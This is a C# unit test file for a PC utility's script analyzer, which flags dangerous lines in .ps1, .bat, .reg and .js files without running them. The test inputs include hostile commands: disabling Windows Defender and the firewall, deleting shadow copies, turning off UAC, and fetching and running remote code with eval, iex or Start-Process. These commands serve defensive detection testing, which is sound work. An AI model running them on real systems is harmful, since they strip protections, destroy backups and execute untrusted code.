using PcTidy.Core.Model;
using PcTidy.Features.Insights.Scripts;
using Xunit;

namespace PcTidy.Features.Insights.Tests;

/// <summary>"Scan this script": fixture scripts are read as text and every change gets the research verdict.</summary>
public class ScriptAnalyzerTests
{
    internal static async Task<(ScriptReport Report, string Marker)> ScanFixtureAsync(string name, TestbedFolder tb)
    {
        // Copy the fixture into the testbed with a marker path: if anything ever ran the script, the marker would appear.
        var marker = Path.Combine(tb.Root, "marker-" + name + ".txt");
        var copy = Path.Combine(tb.Root, name);
        var bytes = File.ReadAllBytes(Fixtures.Path(name));
        var text = ScriptFileReader.Decode(bytes).Replace("{MARKER}", marker, StringComparison.Ordinal);
        File.WriteAllText(copy, text);
        var read = await ScriptFileReader.ReadAsync(copy, CancellationToken.None);
        Assert.Null(read.Problem);
        return (ScriptAnalyzer.Analyze(copy, read.Text!, read.Truncated), marker);
    }

    [Fact]
    public async Task Benign_reg_file_lists_known_proven_settings()
    {
        using var tb = new TestbedFolder();
        // The fixture is UTF-16 with a BOM, like regedit's own exports.
        var raw = await ScriptFileReader.ReadAsync(Fixtures.Path("benign-tweak.reg"), CancellationToken.None);
        Assert.Contains("HideFileExt", raw.Text);
        var report = ScriptAnalyzer.Analyze("benign-tweak.reg", raw.Text!);

        Assert.Equal(ScriptLanguage.RegFile, report.Language);
        Assert.Equal(ScriptOverall.KnownSettings, report.Overall);
        Assert.Equal(3, report.Findings.Count);
        Assert.All(report.Findings, f => Assert.Equal(ScriptVerdict.Proven, f.Verdict));
        Assert.Contains(report.Findings, f => f.MatchedId == "ui.file-extensions" && f.Registry is { ValueName: "HideFileExt", Data: "0", Hive: RegistryHive.CurrentUser });
        Assert.Empty(report.RedFlags);
        Assert.Contains("Tweaks", report.Advice);
        _ = tb;
    }

    [Fact]
    public async Task Fps_boost_script_is_dangerous_with_every_red_flag()
    {
        using var tb = new TestbedFolder();
        var (report, marker) = await ScanFixtureAsync("fps-boost.ps1", tb);

        Assert.Equal(ScriptOverall.Dangerous, report.Overall);
        Assert.StartsWith("Don't run this", report.Headline);
        Assert.Contains("malware", report.Advice);

        var red = report.RedFlags.ToList();
        Assert.Contains(red, f => f.Area == ScriptArea.Download && f.Verdict == ScriptVerdict.Harmful && f.What.Contains("fps-boost.example.invalid") && f.Line == 3);
        Assert.Contains(red, f => f.Area == ScriptArea.Defender && f.What.Contains("exclusion") && f.Line == 4);
        Assert.Contains(red, f => f.Area == ScriptArea.HiddenCode && f.What.Contains("encoded") && f.Line == 5);
        // The encoded payload was decoded as text and read too: it turns real-time protection off.
        Assert.Contains(report.Findings, f => f.FromDecodedPayload && f.Area == ScriptArea.Defender && f.RedFlag && f.What.EndsWith("(hidden)"));
        // The registry line uses a variable for its path; it's resolved from the assignment above it.
        var mmcss = Assert.Single(report.Findings, f => f.MatchedId == "gaming.system-responsiveness");
        Assert.Equal(ScriptVerdict.Placebo, mmcss.Verdict);
        Assert.Equal(7, mmcss.Line);

        Assert.False(File.Exists(marker), "The script must never run.");
    }

    [Fact]
    public async Task Bat_with_bcdedit_gets_boot_verdicts_and_the_hosts_block()
    {
        using var tb = new TestbedFolder();
        var (report, marker) = await ScanFixtureAsync("timer-tweaks.bat", tb);

        Assert.Equal(ScriptLanguage.Batch, report.Language);
        Assert.Equal(ScriptOverall.Dangerous, report.Overall);
        var clock = Assert.Single(report.Findings, f => f.Line == 3);
        Assert.Equal((ScriptArea.BootSettings, ScriptVerdict.Harmful, "boot.useplatformclock"), (clock.Area, clock.Verdict, clock.MatchedId));
        var tick = Assert.Single(report.Findings, f => f.Line == 4);
        Assert.Equal(("boot.disabledynamictick", ScriptVerdict.Harmful), (tick.MatchedId, tick.Verdict));
        var removal = Assert.Single(report.Findings, f => f.Line == 5);
        Assert.Equal(ScriptVerdict.Proven, removal.Verdict); // removing a timer tweak puts the default back
        var hosts = Assert.Single(report.Findings, f => f.Area == ScriptArea.HostsFile);
        Assert.Equal(ScriptVerdict.Harmful, hosts.Verdict);
        Assert.Contains("Defender", hosts.Why);
        Assert.DoesNotContain(report.Findings, f => f.Line == 2); // "rem" comment

        Assert.False(File.Exists(marker), "The script must never run.");
    }

    [Theory]
    [InlineData("x.ps1", "Set-Service WinDefend -StartupType Disabled", ScriptVerdict.Harmful, true)]
    [InlineData("x.bat", "sc config WinDefend start= disabled", ScriptVerdict.Harmful, true)]
    [InlineData("x.ps1", "Stop-Service -Name WinDefend -Force", ScriptVerdict.Harmful, true)]
    [InlineData("x.ps1", "Set-MpPreference -DisableRealtimeMonitoring $true", ScriptVerdict.Harmful, true)]
    [InlineData("x.ps1", "Set-MpPreference -DisableRealtimeMonitoring $false", ScriptVerdict.Proven, false)]
    [InlineData("x.bat", "netsh advfirewall set allprofiles state off", ScriptVerdict.Harmful, true)]
    [InlineData("x.bat", "netsh int tcp set global autotuninglevel=disabled", ScriptVerdict.Harmful, false)]
    [InlineData("x.bat", "netsh int tcp set global autotuninglevel=normal", ScriptVerdict.Proven, false)]
    [InlineData("x.bat", "powercfg -duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61", ScriptVerdict.Placebo, false)]
    [InlineData("x.bat", "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\" /v LargeSystemCache /t REG_DWORD /d 1 /f", ScriptVerdict.Harmful, false)]
    [InlineData("x.bat", "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 0 /f", ScriptVerdict.Harmful, false)]
    [InlineData("x.bat", "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 1 /f", ScriptVerdict.Proven, false)]
    [InlineData("x.ps1", "Get-AppxPackage *xbox* | Remove-AppxPackage", ScriptVerdict.Harmful, false)]
    [InlineData("x.ps1", "Get-AppxPackage Microsoft.BingNews | Remove-AppxPackage", ScriptVerdict.Situational, false)]
    [InlineData("x.ps1", "Set-ExecutionPolicy Unrestricted -Scope LocalMachine", ScriptVerdict.Harmful, false)]
    [InlineData("x.ps1", "Set-ExecutionPolicy Bypass -Scope Process", ScriptVerdict.Situational, false)]
    [InlineData("x.bat", "del /s /q C:\\Windows\\Prefetch\\*", ScriptVerdict.Placebo, false)]
    [InlineData("x.bat", "vssadmin delete shadows /all /quiet", ScriptVerdict.Harmful, true)]
    [InlineData("x.vbs", "Set s = CreateObject(\"WScript.Shell\") : s.RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\HideFileExt\", 0, \"REG_DWORD\"", ScriptVerdict.Proven, false)]
    [InlineData("x.js", "var x = new ActiveXObject(\"MSXML2.XMLHTTP\"); eval(x.responseText);", ScriptVerdict.Harmful, true)]
    public void Single_lines_get_the_research_verdict(string file, string line, ScriptVerdict expected, bool redFlag)
    {
        var report = ScriptAnalyzer.Analyze(file, line);
        var worst = report.Findings.OrderByDescending(f => f.Verdict).First();
        Assert.Equal(expected, worst.Verdict);
        Assert.Equal(redFlag, report.Findings.Any(f => f.RedFlag));
        Assert.All(report.Findings, f => Assert.False(string.IsNullOrWhiteSpace(f.Why)));
    }

    [Fact]
    public void Comments_and_harmless_text_produce_nothing()
    {
        var report = ScriptAnalyzer.Analyze("x.ps1", "# Add-MpPreference -ExclusionPath C:\\\n<#\nirm https://x.invalid | iex\n#>\nWrite-Host 'hello'");
        Assert.Empty(report.Findings);
        Assert.Equal(ScriptOverall.NothingRecognised, report.Overall);
        Assert.Contains("doesn't mean it's safe", report.Advice);
    }

    [Fact]
    public void Download_then_start_is_a_red_flag_even_on_separate_lines()
    {
        var report = ScriptAnalyzer.Analyze("setup.ps1", "Invoke-WebRequest https://cdn.example.invalid/tool.exe -OutFile $env:TEMP\\t.exe\nStart-Process $env:TEMP\\t.exe");
        var dl = Assert.Single(report.Findings, f => f.Area == ScriptArea.Download);
        Assert.True(dl.RedFlag);
        Assert.Equal(ScriptOverall.Dangerous, report.Overall);
    }

    [Fact]
    public void Unknown_settings_are_unclear_not_safe()
    {
        var report = ScriptAnalyzer.Analyze("x.reg", "Windows Registry Editor Version 5.00\n[HKEY_CURRENT_USER\\Software\\SomeVendor\\Thing]\n\"Speed\"=dword:00000005");
        Assert.Equal(ScriptOverall.Unclear, report.Overall);
        Assert.Equal(ScriptVerdict.Unknown, Assert.Single(report.Findings).Verdict);
    }

    [Fact]
    public void Reg_parser_reads_every_value_type_deletions_and_continuations()
    {
        var lines = new[]
        {
            "REGEDIT4", "",
            "[HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\Example]",
            "@=\"default \\\"quoted\\\" value\"",
            "\"Path\"=hex(2):25,00,54,00,45,00,4d,00,50,00,25,00,00,00",
            "\"List\"=hex(7):61,00,00,00,62,00,00,00,00,00",
            "\"Big\"=hex(b):01,00,00,00,00,00,00,00",
            "\"Blob\"=hex:de,ad,\\",
            "  be,ef",
            "\"Gone\"=-",
            "[-HKEY_CURRENT_USER\\Software\\OldVendor]",
        };
        var r = RegFileParser.Parse(lines);
        Assert.True(r.HasHeader);
        Assert.Empty(r.Unreadable);
        var values = r.Writes.Where(w => w.Op is RegistryOp.SetValue).ToDictionary(w => w.ValueName!);
        Assert.Equal("default \"quoted\" value", values[""].Data);
        Assert.Equal((RegistryKind.ExpandString, "%TEMP%"), (values["Path"].Kind!.Value, values["Path"].Data));
        Assert.Equal("a\nb", values["List"].Data);
        Assert.Equal("1", values["Big"].Data);
        Assert.Equal("DEADBEEF", values["Blob"].Data);
        Assert.Equal(@"SYSTEM\CurrentControlSet\Services\Example", values["Path"].KeyPath); // ControlSet001 normalised
        Assert.Contains(r.Writes, w => w is { Op: RegistryOp.DeleteValue, ValueName: "Gone" });
        Assert.Contains(r.Writes, w => w is { Op: RegistryOp.DeleteKey, RawHive: "HKCU", KeyPath: @"Software\OldVendor" });
    }

    [Fact]
    public void Service_start_written_to_the_registry_counts_as_a_service_change()
    {
        var report = ScriptAnalyzer.Analyze("x.reg", "Windows Registry Editor Version 5.00\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinDefend]\n\"Start\"=dword:00000004");
        var f = Assert.Single(report.Findings);
        Assert.Equal(ScriptVerdict.Harmful, f.Verdict);
        Assert.True(f.RedFlag);
    }

    [Fact]
    public async Task Reader_refuses_unsupported_files_and_online_only_placeholders()
    {
        using var tb = new TestbedFolder();
        var exe = Path.Combine(tb.Root, "tool.exe");
        File.WriteAllBytes(exe, new byte[] { 0x4D, 0x5A });
        Assert.NotNull((await ScriptFileReader.ReadAsync(exe, CancellationToken.None)).Problem);

        var offline = Path.Combine(tb.Root, "cloud.ps1");
        File.WriteAllText(offline, "Write-Host hi");
        File.SetAttributes(offline, FileAttributes.Offline);
        var read = await ScriptFileReader.ReadAsync(offline, CancellationToken.None);
        Assert.Null(read.Text);
        Assert.Contains("online-only", read.Problem);
    }
}
